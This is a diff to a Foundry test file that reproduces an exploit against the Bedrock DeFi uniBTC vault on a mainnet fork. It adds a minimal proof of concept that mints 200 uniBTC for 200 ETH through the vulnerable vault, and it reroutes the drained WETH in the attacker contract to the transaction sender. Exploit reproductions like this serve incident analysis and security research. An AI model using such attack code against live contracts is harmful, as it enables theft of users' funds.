@@ -27,23 +27,41 @@ address constant weth = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;
 address constant VulVault = 0x047D41F2544B7F63A8e991aF2068a363d210d6Da;
 
 contract Bedrock_DeFi_exp is Test {
-    Attacker attacker;
+    address attacker = makeAddr("attacker");
+    Attacker attackerC;
 
     function setUp() public {
         vm.createSelectFork("mainnet", 20836584 - 1);
     }
 
-    function testPoC() public {
-        attacker = new Attacker();
+    function testPoCMinimal() public {
+        // Borrow 200 ether to the attacker
+        vm.deal(attacker, 200e18);
 
-        attacker.attack();
+        // The attacker mint 200 ETH to 200 uniBTC
+        vm.startPrank(attacker);
+        IFS(VulVault).mint{value: 200e18}();
 
-        console.log('Final balance in WETH :', IFS(weth).balanceOf(address(this)));
+        // The attacker received 200 uniBTC(~BTC) for 200 ETH
+        console.log('Final balance in uniBTC :', IFS(uniBTC).balanceOf(attacker));
+    }
+
+    function testPoCReplicate() public {
+        vm.startPrank(attacker);
+        attackerC = new Attacker();
+
+        attackerC.attack();
+
+        console.log('Final balance in WETH :', IFS(weth).balanceOf(attacker));
     }
 }
 
 contract Attacker {
+    address txSender;
+
     function attack() external {
+        txSender = msg.sender;
+
         IFS(uniBTC).approve(uniV3Router, type(uint256).max);
         IFS(WBTC).approve(uniV3Router, type(uint256).max);
 
@@ -99,7 +117,7 @@ contract Attacker {
         IFS(weth).transfer(balancerVault, amounts[0]);
 
         uint256 bal_weth = IFS(weth).balanceOf(address(this));
-        IFS(weth).transfer(msg.sender, bal_weth);
+        IFS(weth).transfer(txSender, bal_weth);
     }
 
     receive() external payable {}
